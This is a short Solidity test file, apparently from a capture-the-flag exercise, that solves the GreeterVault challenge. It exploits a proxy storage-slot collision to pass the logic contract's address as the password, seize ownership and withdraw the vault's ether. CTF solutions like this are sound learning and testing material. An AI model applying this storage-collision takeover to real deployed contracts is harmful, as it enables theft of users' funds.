// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./GreeterVault.sol";

/// https://github.com/MetaTrustLabs/ctf/blob/master/greeterVault/contracts/greeterVault.sol

contract GreeterVaultTest is Test {
    SetUp internal _setup;

    function setUp() public {
        _setup = new SetUp{value: 1e18}("password");
    }

    receive() external payable {}

    function test_attack() public {
        VaultLogic(_setup.vault()).changeOwner(
            // The second storage slot in the proxy contract is vault, not password
            bytes32(uint256(uint160(_setup.logic()))),
            payable(address(this))
        );

        VaultLogic(_setup.vault()).withdraw();

        assertTrue(_setup.isSolved());
    }
}
